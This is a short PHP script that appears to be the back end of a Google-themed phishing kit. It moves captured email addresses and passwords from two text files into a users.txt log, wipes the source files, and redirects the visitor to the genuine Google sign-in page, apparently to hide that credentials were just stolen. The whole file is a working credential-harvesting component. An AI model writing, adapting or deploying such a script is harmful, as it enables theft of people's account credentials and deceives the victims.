
<?php
// Ruta de los archivos
$emalFile = 'emal.txt';
$passwFile = 'passw.txt';
$usersFile = 'users.txt';

// Leer contenido de emal.txt y passw.txt
$emalContent = file_get_contents($emalFile);
$passwContent = file_get_contents($passwFile);

// Guardar contenido en users.txt
file_put_contents($usersFile, "Email: $emalContent\nPassword: $passwContent\n", FILE_APPEND);

// Limpiar contenido de emal.txt y passw.txt
file_put_contents($emalFile, '');
file_put_contents($passwFile, '');

echo 'Processo concluído com sucesso.';
header('Location: https://accounts.google.com/v3/signin/identifier?continue=https%3A%2F%2Fwww.google.com%2F&ec=GAZAmgQ&hl=pt-PT&ifkv=ARpgrqe7dytT_ah-5s7CLJWEyhXZAWIW6XA3YC5ylr1Xhfn4vug1uzujLGZ3qvFLhT4D9HpJ-BSbTA&passive=true&flowName=GlifWebSignIn&flowEntry=ServiceLogin&dsh=S339302831%3A1727202766933463&ddm=0');
?>